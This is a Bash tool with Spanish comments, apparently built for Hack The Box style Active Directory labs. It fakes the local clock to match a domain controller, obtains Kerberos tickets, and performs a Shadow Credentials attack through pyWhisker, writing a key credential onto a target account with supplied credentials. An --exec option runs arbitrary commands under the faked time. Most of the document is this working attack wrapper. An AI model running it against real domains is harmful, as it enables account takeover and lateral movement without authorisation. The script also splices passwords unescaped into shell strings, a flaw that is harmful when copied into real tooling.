#!/bin/bash
# ============================================================
# faketime_sync.sh - Sincronización de hora virtual con faketime
# No modifica la hora del sistema, solo la emula
# Soporta: --tgt, --shadow, --exec, --show-time
# ============================================================

set -euo pipefail

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variables globales
DC_IP=""
DOMAIN=""
USER=""
PASSWORD=""
ACTION=""
TARGET=""
COMMAND=""
DC_TIME=""
KRB5_CONFIG_FILE="/tmp/krb5_faketime.conf"

# ─────────────────────────────────────────────
log_info() { echo -e "${BLUE}[*]${NC} $*"; }
log_ok()   { echo -e "${GREEN}[+]${NC} $*"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $*"; }
log_err()  { echo -e "${RED}[-]${NC} $*"; }
# ─────────────────────────────────────────────

usage() {
    cat << EOF
Uso: $0 <DC_IP> <DOMAIN> [USER] [PASSWORD] [OPCIONES]

OPCIONES:
  --tgt                    Obtener TGT (Ticket Granting Ticket)
  --shadow <target>        Realizar Shadow Credentials attack
  --exec <comando>         Ejecutar comando con hora sincronizada
  --show-time              Solo mostrar la hora virtual

Ejemplos:
  $0 10.129.35.21 logging.htb
  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --tgt
  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --shadow 'msa_health\$'
  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --exec 'klist'
  $0 10.129.35.21 logging.htb --show-time
EOF
    exit 1
}

# ─────────────────────────────────────────────
check_deps() {
    local missing=()
    for cmd in faketime kinit nmap; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        log_warn "Dependencias faltantes: ${missing[*]}"
        log_info "Intentando instalar..."
        sudo apt-get install -y faketime krb5-user nmap 2>/dev/null \
            || log_warn "Instala manualmente: ${missing[*]}"
    fi
}

# ─────────────────────────────────────────────
get_dc_time() {
    log_info "Obteniendo hora del DC: $DC_IP"

    # Método 1: nmap smb2-time (más confiable en CTFs)
    if command -v nmap &>/dev/null; then
        local nmap_time
        nmap_time=$(timeout 10 nmap --script smb2-time -p 445 "$DC_IP" 2>/dev/null \
            | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}')
        if [[ -n "$nmap_time" ]]; then
            DC_TIME=$(echo "$nmap_time" | tr 'T' ' ')
            log_ok "Hora DC (via nmap smb2-time): $DC_TIME"
            return 0
        fi
    fi

    # Método 2: ntpdate — solo parte entera del offset
    if command -v ntpdate &>/dev/null; then
        local raw_offset
        raw_offset=$(timeout 5 sudo ntpdate -q "$DC_IP" 2>&1 \
            | grep -oP 'offset [+-]?\K\d+' | head -1)
        if [[ -n "$raw_offset" ]]; then
            DC_TIME=$(date -d "+${raw_offset} seconds" '+%Y-%m-%d %H:%M:%S')
            log_ok "Hora DC (via ntpdate): $DC_TIME"
            return 0
        fi
    fi

    # Método 3: LDAP con credenciales
    if [[ -n "$USER" && -n "$PASSWORD" ]] && command -v ldapsearch &>/dev/null; then
        local ldap_time
        ldap_time=$(timeout 5 ldapsearch -H "ldap://$DC_IP" -x \
            -D "${DOMAIN}\\${USER}" -w "$PASSWORD" \
            -s base -b "" currentTime 2>/dev/null \
            | grep currentTime | awk '{print $2}')
        if [[ -n "$ldap_time" ]]; then
            DC_TIME=$(echo "$ldap_time" | sed 's/\.0Z$//' \
                | sed 's/\(....\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1-\2-\3 \4:\5:\6/')
            log_ok "Hora DC (via LDAP): $DC_TIME"
            return 0
        fi
    fi

    # Fallback
    log_warn "No se pudo obtener hora exacta — usando offset +7h por defecto"
    DC_TIME=$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')
}

# ─────────────────────────────────────────────
setup_kerberos() {
    local realm="${DOMAIN^^}"
    cat > "$KRB5_CONFIG_FILE" << EOF
[libdefaults]
    default_realm = ${realm}
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    clockskew = 300

[realms]
    ${realm} = {
        kdc = ${DC_IP}
        admin_server = ${DC_IP}
    }

[domain_realm]
    .${DOMAIN} = ${realm}
    ${DOMAIN} = ${realm}
EOF
    export KRB5_CONFIG="$KRB5_CONFIG_FILE"
    log_ok "Kerberos config → $KRB5_CONFIG_FILE"
}

# ─────────────────────────────────────────────
get_tgt() {
    [[ -z "$USER" || -z "$PASSWORD" ]] && {
        log_err "Se requiere USER y PASSWORD para --tgt"
        exit 1
    }

    log_info "Obteniendo TGT para $USER@${DOMAIN^^}"
    setup_kerberos

    local pass_file
    pass_file=$(mktemp /tmp/.krb_pass_XXXXXX)
    echo "$PASSWORD" > "$pass_file"
    chmod 600 "$pass_file"

    if faketime "$DC_TIME" bash -c "
        export KRB5_CONFIG='$KRB5_CONFIG_FILE'
        kinit '$USER@${DOMAIN^^}' < '$pass_file'
    "; then
        log_ok "TGT obtenido exitosamente"
        echo ""
        KRB5_CONFIG="$KRB5_CONFIG_FILE" klist
    else
        log_err "Error al obtener TGT — verifica credenciales u hora"
    fi

    rm -f "$pass_file"
}

# ─────────────────────────────────────────────
shadow_credentials() {
    [[ -z "$TARGET" ]]   && { log_err "Especifica el target con --shadow <target>"; exit 1; }
    [[ -z "$USER" ]]     && { log_err "Se requiere USER para --shadow"; exit 1; }
    [[ -z "$PASSWORD" ]] && { log_err "Se requiere PASSWORD para --shadow"; exit 1; }

    log_info "Shadow Credentials attack"
    log_info "Target : $TARGET"
    log_info "User   : $USER"
    setup_kerberos

    local pass_file
    pass_file=$(mktemp /tmp/.krb_pass_XXXXXX)
    echo "$PASSWORD" > "$pass_file"
    chmod 600 "$pass_file"

    faketime "$DC_TIME" bash -c "
        export KRB5_CONFIG='$KRB5_CONFIG_FILE'
        kinit '$USER@${DOMAIN^^}' < '$pass_file'

        WHISKER_DIR=\$(find ~ -name 'pywhisker.py' -maxdepth 6 2>/dev/null | head -1 | xargs -I{} dirname {} 2>/dev/null)

        if [[ -z \"\$WHISKER_DIR\" ]]; then
            echo '[-] pyWhisker no encontrado en ~'
            echo '    Clónalo con: git clone https://github.com/ShutdownRepo/pywhisker'
            exit 1
        fi

        cd \"\$WHISKER_DIR\"
        [[ -d venv ]] && source venv/bin/activate

        python3 pywhisker.py \
            -d '$DOMAIN' \
            -u '$USER' \
            -p '$PASSWORD' \
            --target '$TARGET' \
            --action add \
            --dc-ip '$DC_IP'
    "

    rm -f "$pass_file"
}

# ─────────────────────────────────────────────
exec_command() {
    [[ -z "$COMMAND" ]] && { log_err "Especifica el comando con --exec '<cmd>'"; exit 1; }

    log_info "Hora virtual : $DC_TIME"
    log_info "Comando      : $COMMAND"
    echo ""

    KRB5_CONFIG="$KRB5_CONFIG_FILE" faketime "$DC_TIME" bash -c "$COMMAND"
}

# ─────────────────────────────────────────────
parse_args() {
    [[ $# -lt 2 ]] && usage

    DC_IP="$1"
    DOMAIN="$2"
    USER="${3:-}"
    PASSWORD="${4:-}"

    # Shift dinámico según cuántos args posicionales hay
    local skip=2
    [[ -n "$USER" ]]     && (( skip++ ))
    [[ -n "$PASSWORD" ]] && (( skip++ ))
    shift "$skip"

    while [[ $# -gt 0 ]]; do
        case $1 in
            --tgt)
                ACTION="tgt"
                shift
                ;;
            --shadow)
                ACTION="shadow"
                TARGET="${2:-}"
                [[ -z "$TARGET" ]] && { log_err "--shadow requiere un <target>"; exit 1; }
                shift 2
                ;;
            --exec)
                ACTION="exec"
                COMMAND="${2:-}"
                [[ -z "$COMMAND" ]] && { log_err "--exec requiere un <comando>"; exit 1; }
                shift 2
                ;;
            --show-time)
                ACTION="show-time"
                shift
                ;;
            *)
                log_err "Opción desconocida: $1"
                usage
                ;;
        esac
    done
}

# ─────────────────────────────────────────────
main() {
    parse_args "$@"
    check_deps
    get_dc_time

    echo ""
    log_info "Hora virtual : $DC_TIME"
    log_info "Hora real    : $(date '+%Y-%m-%d %H:%M:%S')"
    echo ""

    case $ACTION in
        tgt)
            get_tgt
            ;;
        shadow)
            shadow_credentials
            ;;
        exec)
            exec_command
            ;;
        show-time)
            log_ok "$DC_TIME"
            ;;
        "")
            log_ok "Sincronización lista. Úsala así:"
            echo ""
            echo "  faketime '$DC_TIME' kinit ${USER:-<user>}@${DOMAIN^^}"
            echo "  faketime '$DC_TIME' python3 pywhisker.py ..."
            echo "  KRB5_CONFIG=$KRB5_CONFIG_FILE faketime '$DC_TIME' <cmd>"
            echo ""
            ;;
    esac
}

main "$@"
